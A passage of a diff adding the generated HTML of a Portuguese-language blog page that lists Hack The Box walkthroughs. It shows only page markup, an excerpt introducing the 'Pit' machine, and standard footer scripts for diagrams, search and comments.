+    <span class="page__meta-lang"><a href="/en-US/walkthrough/2021/08/htb-knife">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Compartilhar</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Pit, outra máquina Linux classificada como mediana Hack The Box, criada por polarbearer e GibParadox.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Digite seu termo de busca...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Digite seu termo de busca...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Mermaid.js -->
+<script type="module">
+    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
+    const config = {
+        "theme": "dark", 
+        "startOnLoad": true
+    };
+    mermaid.initialize(config);
+</script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Siga:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Revisar consentimento</a></li>-->
+    
+      
+    
+      
+        
+          <li><a href="/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+        
+        
+        
+      
+    
+    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
+    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
+    script.setAttribute('issue-term', 'htb-knife');
+    
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+
+  </body>
+</html>
